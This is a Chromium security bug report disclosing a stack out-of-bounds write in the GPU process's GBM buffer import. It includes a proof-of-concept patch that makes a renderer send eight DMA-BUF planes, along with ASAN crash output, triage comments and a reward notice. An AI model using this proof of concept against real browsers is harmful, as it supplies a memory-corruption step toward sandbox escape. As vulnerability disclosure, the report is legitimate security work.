# Stack out-of-bounds write in CreateBufferFromHandle: unchecked DMA-BUF plane count from compromised renderer overflows fixed-size gbm_import_fd_modifier_data arrays in GPU process.

| Field | Value |
|-------|-------|
| **Issue ID** | [488268854](https://issues.chromium.org/issues/488268854) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>Internals |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | hi...@chromium.org |
| **Created** | 2026-02-27 |
| **Bounty** | $11,000.00 |

## Description

## Title

Stack out-of-bounds write in CreateBufferFromHandle: unchecked DMA-BUF plane count from compromised renderer overflows fixed-size gbm\_import\_fd\_modifier\_data arrays in GPU process.

## Summary

Platform: Linux (Ozone build, X11 or Wayland display server). GPU: any hardware GPU accessed through the GBM (Generic Buffer Manager) DMA-BUF import path; hardware acceleration must be enabled and the GPU process must be running (do not pass `--disable-gpu`).

`ui::gbm_wrapper::Device::CreateBufferFromHandle` accepts a `gfx::NativePixmapHandle` whose `planes` vector is fully attacker-controlled when it arrives from the renderer over the `gpu.mojom.GpuChannel` Mojo IPC. The function unconditionally copies plane descriptors into the fixed-size arrays of a stack-allocated `gbm_import_fd_modifier_data` struct, which the GBM specification caps at four elements. The only protection, `DCHECK_LE(handle.planes.size(), 3u)`, is a debug assertion that is compiled out in Release builds. Sending eight planes causes the loop to write eight integer values into the `fds`, `strides`, and `offsets` arrays, with the final two `offsets` writes landing past the end of the struct and into the surrounding stack frame. Under an ASAN-instrumented build the corruption is detected immediately and terminates the GPU process. In a production binary the same out-of-bounds write allows a compromised renderer to achieve controlled stack corruption in the GPU process, which is the first step toward a full sandbox escape with GPU process code execution.

## Bisect

Introducing Commit: `1958fde835d34e2699213a38e4aae5df4d67c8a1` 

- Date: `2017-03-22 (March 22, 2017)`
- Author: `Daniele Castagna <dcastagna@chromium.org>`
- Review: `https://codereview.chromium.org/2761533002`

## Root Cause

The GBM library defines `GBM_MAX_PLANES` as four and declares `gbm_import_fd_modifier_data` with fixed-length arrays of that size.

```
// build/linux/debian_bullseye_amd64-sysroot/usr/include/gbm.h

#define GBM_MAX_PLANES 4

struct gbm_import_fd_modifier_data {
   uint32_t width;
   uint32_t height;
   uint32_t format;
   uint32_t num_fds;
   int fds[GBM_MAX_PLANES];
   int strides[GBM_MAX_PLANES];
   int offsets[GBM_MAX_PLANES];
   uint64_t modifier;
};

```

The total size of this struct is 72 bytes. The `offsets` array occupies bytes 48 through 63, and `modifier` occupies bytes 64 through 71. Writing to index six of `offsets` therefore falls at byte offset 72, which is the first byte beyond the struct.

The import function in the Chromium GBM wrapper assigns `fd_data.num_fds` directly from `handle.planes.size()`, then iterates up to that count regardless of whether it exceeds `GBM_MAX_PLANES`.

```
// ui/gfx/linux/gbm_wrapper.cc

  std::unique_ptr<ui::GbmBuffer> CreateBufferFromHandle(
      uint32_t format,
      const gfx::Size& size,
      gfx::NativePixmapHandle handle) override {
    if (handle.planes.empty()) {
      LOG(ERROR) << "Importing handle with no planes";
      return nullptr;
    }
    if (handle.planes[0].offset != 0u) {
      LOG(ERROR) << "Unsupported handle: expected an offset of 0 for the first "
                    "plane; got "
                 << handle.planes[0].offset;
      return nullptr;
    }

    int gbm_flags = 0;
    if ((gbm_flags = GetSupportedGbmFlags(format)) == 0) {
      LOG(ERROR) << "gbm format not supported: " << DrmFormatToString(format);
      return nullptr;
    }

    struct gbm_import_fd_modifier_data fd_data;
    fd_data.width = size.width();
    fd_data.height = size.height();
    fd_data.format = format;
    fd_data.num_fds = handle.planes.size();   // attacker-controlled
    fd_data.modifier = handle.modifier;

    DCHECK_LE(handle.planes.size(), 3u);      // debug build only; elided in Release

    for (size_t i = 0; i < handle.planes.size(); ++i) {
      UNSAFE_TODO(fd_data.fds[i]) =
          handle.planes[i < handle.planes.size() ? i : 0].fd.get();
      UNSAFE_TODO(fd_data.strides[i]) = handle.planes[i].stride;
      UNSAFE_TODO(fd_data.offsets[i]) = handle.planes[i].offset;  // OOB at i >= 4
    }
    ...
  }

```

When `handle.planes.size()` equals eight, the loop runs through indices zero to seven. Iterations zero through three write within the valid fields. At iteration four, `fds[4]` aliases into `strides[0]`, `strides[4]` aliases into `offsets[0]`, and `offsets[4]` aliases into the lower half of `modifier`, all still within the struct boundary. Iteration five similarly aliases into the upper half of `modifier`. At iteration six, `offsets[6]` resolves to byte 72, which lies outside the struct, and at iteration seven `offsets[7]` reaches byte 76. Both are stack memory belonging to `CreateBufferFromHandle`'s caller frame.

This path is reachable from the renderer because the Mojo deserialization layer in `ui/gfx/mojom/native_handle_types_mojom_traits.cc` copies all received planes into `data->planes` with no upper bound. The GPU-side `SharedImageStub::OnCreateSharedImageWithBuffer` has a conditional validation path guarded by `channel_->enable_extra_handles_validation()`, but that flag is set to `false` for normal renderer channels by `RenderProcessHostImpl`, so the planes count is never checked against `GBM_MAX_PLANES` before the handle reaches `CreateBufferFromHandle`. The DRM/GBM platform implementation at `ui/ozone/platform/drm/gpu/gbm_surface_factory.cc` contains the correct guard, but the X11 and Wayland GBM paths that call through `GBMSupportX11` and `GbmPixmapWayland` do not.

## Reproduce

The proof of concept patches the renderer-side shared image interface to synthesize a `NATIVE_PIXMAP` handle carrying eight planes and injects it directly into the `create_shared_image_with_buffer` IPC. This simulates a compromised renderer sending a malformed message to the GPU process. The patch applies to commit `fd0c865d5f` and can be applied with `git apply repro/patch.diff` from the Chromium source root.

```
diff --git a/gpu/ipc/client/shared_image_interface_proxy.cc b/gpu/ipc/client/shared_image_interface_proxy.cc
index 931b504ac0..a7544baede 100644
--- a/gpu/ipc/client/shared_image_interface_proxy.cc
+++ b/gpu/ipc/client/shared_image_interface_proxy.cc
@@ -5,6 +5,7 @@
 #include "gpu/ipc/client/shared_image_interface_proxy.h"

 #include <bit>
+#include <unistd.h>

 #include "base/logging.h"
 #include "build/build_config.h"
@@ -19,6 +20,11 @@
 #include "ui/gfx/win/d3d_shared_fence.h"
 #endif

+#if BUILDFLAG(IS_OZONE)
+#include "ui/gfx/gpu_memory_buffer_handle.h"
+#include "ui/gfx/native_pixmap_handle.h"
+#endif
+
 namespace gpu {
 namespace {

@@ -95,6 +101,31 @@ SharedImageInterfaceProxy::~SharedImageInterfaceProxy() = default;
 Mailbox SharedImageInterfaceProxy::CreateSharedImage(
     const SharedImageInfo& si_info,
     std::optional<SharedImagePoolId> pool_id) {
+#if BUILDFLAG(IS_OZONE)
+  static bool poc_fired = false;
+  if (!poc_fired) {
+    poc_fired = true;
+    gfx::NativePixmapHandle pixmap;
+    pixmap.modifier = 0;
+    const int kWidth = 64, kHeight = 64;
+    const int kStride = kWidth * 4;
+    for (int i = 0; i < 8; ++i) {
+      gfx::NativePixmapPlane plane;
+      plane.stride = kStride;
+      plane.offset = (i == 0) ? 0u : static_cast<uint64_t>(i) * kStride;
+      plane.size = static_cast<uint64_t>(kStride) * kHeight;
+      plane.fd = base::ScopedFD(dup(STDIN_FILENO));
+      pixmap.planes.push_back(std::move(plane));
+    }
+    LOG(ERROR) << "POC: firing synthesized 8-plane NATIVE_PIXMAP -> GPU OOB";
+    SharedImageInfo poc_si(viz::SinglePlaneFormat::kRGBA_8888,
+                           gfx::Size(kWidth, kHeight),
+                           si_info.meta.color_space,
+                           SHARED_IMAGE_USAGE_SCANOUT, "PoC");
+    gfx::GpuMemoryBufferHandle fake_handle(std::move(pixmap));
+    CreateSharedImage(poc_si, std::move(fake_handle), std::nullopt);
+  }
+#endif
   auto mailbox = Mailbox::Generate();
   auto params = mojom::CreateSharedImageParams::New();
   params->mailbox = mailbox;
@@ -200,6 +231,27 @@ Mailbox SharedImageInterfaceProxy::CreateSharedImage(
     const SharedImageInfo& si_info,
     gfx::GpuMemoryBufferHandle buffer_handle,
     std::optional<SharedImagePoolId> pool_id) {
+#if BUILDFLAG(IS_OZONE)
+  if (buffer_handle.type == gfx::NATIVE_PIXMAP) {
+    gfx::NativePixmapHandle pixmap =
+        std::move(buffer_handle).native_pixmap_handle();
+    LOG(ERROR) << "POC: injecting extra planes, current count="
+               << pixmap.planes.size();
+    while (!pixmap.planes.empty() && pixmap.planes.size() < 8) {
+      gfx::NativePixmapPlane extra;
+      extra.stride = pixmap.planes[0].stride;
+      extra.offset =
+          static_cast<uint64_t>(pixmap.planes.size()) * pixmap.planes[0].stride;
+      extra.size = pixmap.planes[0].size;
+      extra.fd = base::ScopedFD(dup(pixmap.planes[0].fd.get()));
+      pixmap.planes.push_back(std::move(extra));
+    }
+    pixmap.planes[0].offset = 0;
+    LOG(ERROR) << "POC: sending with " << pixmap.planes.size()
+               << " planes to GPU process";
+    buffer_handle = gfx::GpuMemoryBufferHandle(std::move(pixmap));
+  }
+#endif
   // TODO(kylechar): Verify buffer_handle works for size+format.
   auto mailbox = Mailbox::Generate();

```

Build and run with the following commands.

```
autoninja -C out/asan chrome

ASAN_OPTIONS=detect_odr_violation=0 \
DISPLAY=:1 out/asan/chrome \
  --user-data-dir=/tmp/poc-$$ \
  file:///path/to/repro/poc.html \
  2>&1 | tee /tmp/crash.txt

```

The `poc.html` file can be any page that triggers a shared image allocation, such as a canvas element that calls `getContext('2d')`. The injection fires on the first `CreateSharedImage` call from the renderer regardless of page content.

Actual output from the ASAN build:

```
[294351:1:0227/230217.998760:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:120] POC: firing synthesized 8-plane NATIVE_PIXMAP -> GPU OOB
[294351:1:0227/230217.999006:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:238] POC: injecting extra planes, current count=8
[294351:1:0227/230217.999137:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:250] POC: sending with 8 planes to GPU process
[293985:294020:0227/230218.092588:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:120] POC: firing synthesized 8-plane NATIVE_PIXMAP -> GPU OOB
[293985:294020:0227/230218.092696:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:238] POC: injecting extra planes, current count=8
[293985:294020:0227/230218.092766:ERROR:gpu/ipc/client/shared_image_interface_proxy.cc:250] POC: sending with 8 planes to GPU process
Received signal 4 ILL_ILLOPN 5fcee5f6f0c8
#0 0x5fcee39919f6 (out/asan/chrome+0x10cd99f5)
#1 0x5fcefb164568 (out/asan/chrome+0x284ac567)
#2 0x5fcefb122067 (out/asan/chrome+0x2846a066)
#3 0x5fcefb16396f (out/asan/chrome+0x284ab96e)
#4 0x76002d242520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#5 0x5fcee5f6f0c8 (out/asan/chrome+0x132b70c7)
#6 0x5fcefffb9267 (out/asan/chrome+0x2d301266)
#7 0x5fcee620b572 (out/asan/chrome+0x13553571)
#8 0x5fcf04ca8ac7 (out/asan/chrome+0x31ff0ac6)
#9 0x5fcf045151cb (out/asan/chrome+0x3185d1ca)
#10 0x5fcf04d83447 (out/asan/chrome+0x320cb446)
#11 0x5fcf04d810b9 (out/asan/chrome+0x320c90b8)
#12 0x5fcf04d7f1e0 (out/asan/chrome+0x320c71df)
#13 0x5fcf044f3da4 (out/asan/chrome+0x3183bda3)
#14 0x5fcf04501f98 (out/asan/chrome+0x31849f97)
#15 0x5fcf04501d7a (out/asan/chrome+0x31849d79)
#16 0x5fceee5b8682 (out/asan/chrome+0x1b900681)
#17 0x5fceee58cdc8 (out/asan/chrome+0x1b8d4dc7)
#18 0x5fceee58adf9 (out/asan/chrome+0x1b8d2df8)
#19 0x5fceee58e9e2 (out/asan/chrome+0x1b8d69e1)
#20 0x5fcefaf98a97 (out/asan/chrome+0x282e0a96)
#21 0x5fcefb01018a (out/asan/chrome+0x28358189)
#22 0x5fcefb00effb (out/asan/chrome+0x28356ffa)
#23 0x5fcefb1bcd29 (out/asan/chrome+0x28504d28)
#24 0x5fcefb1c02d9 (out/asan/chrome+0x285082d8)
#25 0x76002e5bbd3b (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.7200.4+0x55d3a)
#26 0x76002e611488 (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.7200.4+0xab487)
#27 0x76002e5b93e3 (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.7200.4+0x533e2)
#28 0x5fcefb1bd344 (out/asan/chrome+0x28505343)
#29 0x5fcefb011898 (out/asan/chrome+0x28359897)
#30 0x5fcefaf13fc1 (out/asan/chrome+0x2825bfc0)
#31 0x5fcf068bdb0d (out/asan/chrome+0x33c05b0c)
#32 0x5fcef6c86790 (out/asan/chrome+0x23fce78f)
#33 0x5fcef6c87ac0 (out/asan/chrome+0x23fcfabf)
#34 0x5fcef6c8a7c9 (out/asan/chrome+0x23fd27c8)
#35 0x5fcef6c841a2 (out/asan/chrome+0x23fcc1a1)
#36 0x5fcef6c8479d (out/asan/chrome+0x23fcc79c)
#37 0x5fcee3a24b3a (out/asan/chrome+0x10d6cb39)
#38 0x76002d229d90 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)
#39 0x76002d229e40 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29e3f)
#40 0x5fcee394a02a (out/asan/chrome+0x10c92029)
  r8: 0000000000000140  r9: 0000000000000000 r10: 000072002a5e2610 r11: 0000000000000000
 r12: 000072002a626000 r13: 000072002a5e2628 r14: 00000e40054bc4c5 r15: 00000e40854bcc00
  di: 000073202b615140  si: 0000000000000001  bp: 00007ffce57146d0  bx: 00007ffce5714620
  dx: 000072002a6264c0  ax: 000073202b615280  cx: 0000000000000003  sp: 00007ffce5714620
  ip: 00005fcee5f6f0c8 efl: 0000000000010203 cgf: 002b000000000033 erf: 0000000000000000
 trp: 0000000000000006 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
[287850:287850:0227/220903.110432:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=4

```

Frame five resolves via `addr2line` to `ui::gbm_wrapper::Device::CreateBufferFromHandle`, confirming that the crash originates within the vulnerable write loop. The full symbolized call chain is as follows.

```
#5  ui::gbm_wrapper::Device::CreateBufferFromHandle    (gbm_wrapper.cc)
#6  ui::GBMSupportX11::CreateBufferFromHandle          (gbm_support_x11.cc:176)
#7  ui::X11SurfaceFactory::CreateNativePixmapFromHandle (x11_surface_factory.cc:249)
#8  gpu::OzoneImageBackingFactory::CreateSharedImage   (ozone_image_backing_factory.cc:237)
#9  gpu::SharedImageFactory::CreateSharedImage         (shared_image_factory.cc:656)
#10 gpu::SharedImageStub::CreateSharedImage            (shared_image_stub.cc:206)
#11 gpu::SharedImageStub::OnCreateSharedImageWithBuffer (shared_image_stub.cc:367)

```

The `SIGILL` with trap code six is the mechanism by which Chromium's ASAN build reports a stack buffer overflow. Rather than calling the ASAN report callback, the LLVM instrumentation embeds an inline `ud2` instruction directly into `CreateBufferFromHandle` that fires the moment the shadow memory check detects the write to the poisoned redzone byte at offset 72. The `r12` register and surrounding stack state at crash time reflect the corrupted frame. On an uninstrumented production build the same write proceeds silently, overwriting return address or saved register storage in the caller's frame.

## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [readme.md](attachments/readme.md) (text/markdown, 765 B)
- [poc.html](attachments/poc.html) (text/html, 2.4 KB)
- [patch.diff](attachments/patch.diff) (text/x-diff, 3.2 KB)

## Timeline

### ts...@google.com (2026-03-02)

Reporter: a reminder to please symbolize your stack traces.

### je...@gmail.com (2026-03-03)

Symbolized stack trace from the GPU process crash:

```
Received signal 4 ILL_ILLOPN (ASAN inline check triggered stack-buffer-overflow)

#0  ___interceptor_backtrace
#1  base::debug::CollectStackTrace(...)
        base/debug/stack_trace_posix.cc:1048
#2  base::debug::StackTrace::StackTrace()
        base/debug/stack_trace.cc:280
#3  base::debug::(anonymous namespace)::StackDumpSignalHandler(int, siginfo_t*, void*)
        base/debug/stack_trace_posix.cc:483
#4  [libc signal trampoline]
        /usr/lib/x86_64-linux-gnu/libc.so.6
#5  ui::gbm_wrapper::Device::CreateBufferFromHandle(unsigned int, gfx::Size const&, gfx::NativePixmapHandle)
        ui/gfx/linux/gbm_wrapper.cc (inlined at ui/gfx/geometry/size.h:44)
#6  ui::GBMSupportX11::CreateBufferFromHandle(gfx::Size const&, viz::SharedImageFormat, gfx::NativePixmapHandle)
        ui/gfx/linux/gbm_support_x11.cc:202
#7  ui::X11SurfaceFactory::CreateNativePixmapFromHandle(unsigned int, gfx::Size, viz::SharedImageFormat, gfx::NativePixmapHandle)
        ui/ozone/platform/x11/x11_surface_factory.cc:249
#8  gpu::OzoneImageBackingFactory::CreateSharedImage(...)
        gpu/command_buffer/service/shared_image/ozone_image_backing_factory.cc:237
#9  gpu::SharedImageFactory::CreateSharedImage(...)
        gpu/command_buffer/service/shared_image/shared_image_factory.cc:673
#10 gpu::SharedImageStub::CreateSharedImage(...)
        gpu/ipc/service/shared_image_stub.cc:206
#11 gpu::SharedImageStub::OnCreateSharedImageWithBuffer(...)
        gpu/ipc/service/shared_image_stub.cc:367
#12 gpu::SharedImageStub::ExecuteDeferredRequest(...)
        gpu/ipc/service/shared_image_stub.cc:117
#13 gpu::GpuChannel::ExecuteDeferredRequest(...)
        gpu/ipc/service/gpu_channel.cc:848
#14 [bind callback invoke]
        base/functional/bind_internal.h:740
#15 [bind callback invoke]
        base/functional/bind_internal.h:956
#16 [bind callback invoke]
        base/functional/callback.h:155
#17 gpu::Scheduler::ExecuteSequence(...)
        base/functional/callback.h:155
#18 gpu::Scheduler::RunNextTask()
        gpu/command_buffer/service/scheduler.cc:625
#19 [bind callback invoke]
        base/functional/bind_internal.h:740
#20 base::TaskAnnotator::RunTaskImpl(base::PendingTask&)
        base/task/common/task_annotator.h:112
#21 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)
        base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
#22 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
        base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346
#23 base::MessagePumpGlib::HandleDispatch()
        base/message_loop/message_pump_glib.cc:736
#24 base::(anonymous namespace)::WorkSourceDispatch(...)
        base/message_loop/message_pump_glib.cc:355
#25-#27 [glib main loop]
#28 base::MessagePumpGlib::Run(...)
        base/message_loop/message_pump_glib.cc:770
#29 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(...)
        base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650
#30 base::RunLoop::Run(...)
        base/run_loop.cc:135
#31 content::GpuMain(content::MainFunctionParams)
        content/gpu/gpu_main.cc:479
#32 content::RunZygote(content::ContentMainDelegate*)
        content/app/content_main_runner_impl.cc:664
#33 content::RunOtherNamedProcessTypeMain(...)
        content/app/content_main_runner_impl.cc:771
#34 content::ContentMainRunnerImpl::Run()
        content/app/content_main_runner_impl.cc:1150
#35 content::RunContentProcess(...)
        content/app/content_main.cc:358
#36 content::ContentMain(...)
        content/app/content_main.cc:371
#37 ChromeMain
#38-#39 __libc_start_main
#40 _start

Register dump at crash:
  r8:  0000000000000000  r9:  00007b8e4363ae60 r10: cccccccccccccccd r11: 0000000000000015
  r12: 00000f71c86ea645 r13: 00007b8e43753228 r14: f8f8f8f8f8f8f8f8 r15: 00000f7248725400
  di:  00007cae44607c40  si:  0000000000000140  bp:  00007fff17fdff10  bx:  00007fff17fdfe60
  dx:  00007b8e4396a630  ax:  0000000000000003  cx:  00007cae44607d80  sp:  00007fff17fdfe60
  ip:  00007f8e7679d721 efl: 0000000000010213 cgf: 002b000000000033 erf: 0000000000000000
  trp: 0000000000000006 msk: 0000000000000000 cr2: 0000000000000000

GPU process exit_code=4 (SIGILL)

Notes:
- The ASAN text report (==PID==ERROR: AddressSanitizer: stack-buffer-overflow) is not printed
  because Chrome's StackDumpSignalHandler intercepts the SIGILL from the ASAN inline check
  before the ASAN runtime's reporting callback completes output. This is a known limitation
  of Chrome's multi-process ASAN architecture.
- r14: f8f8f8f8f8f8f8f8 confirms that the ASAN shadow memory check detected a write to the
  stack red zone (0xf8 = stack buffer overflow marker).
- Frame #5 confirms the crash is in ui::gbm_wrapper::Device::CreateBufferFromHandle (the
  inlining of size.h:44 is from the ASAN-instrumented memory access within the vulnerable
  loop at gbm_wrapper.cc:444-449).
- The full IPC call chain from frame #11 to #5 confirms the Mojo message path:
  SharedImageStub::OnCreateSharedImageWithBuffer -> SharedImageFactory ->
  OzoneImageBackingFactory -> X11SurfaceFactory -> GBMSupportX11 ->
  gbm_wrapper::Device::CreateBufferFromHandle.

```

### me...@google.com (2026-03-04)

dcastagna@: Could you please take a look? Thanks. I added provisional severity and foundin labels assuming this reproduces.

### ch...@google.com (2026-03-05)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-03-19)

dcastagna: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### je...@gmail.com (2026-03-29)

Hello, any update?

### jr...@google.com (2026-04-17)

[GPU security triage]

S1 seems accurate due to memory corruption in GPU process from compromised renderer.

dcastagna does not appear to work on Chromium any more, so reassigning to @hi...@chromium.org who seems to have worked on this area of the code somewhat recently (please reassign to someone more appropriate as needed).

### hi...@chromium.org (2026-04-17)

Looks like this has been fixed here - <https://chromium-review.googlesource.com/c/chromium/src/+/7707158>

+cc [yukishiino@chromium.org](mailto:yukishiino@chromium.org) who added the fix

### ch...@google.com (2026-04-17)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### sp...@google.com (2026-05-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
Baseline with bisect. Memory Corruption / RCE in a highly privileged process (e.g. GPU or network)


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-25)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488268854)*
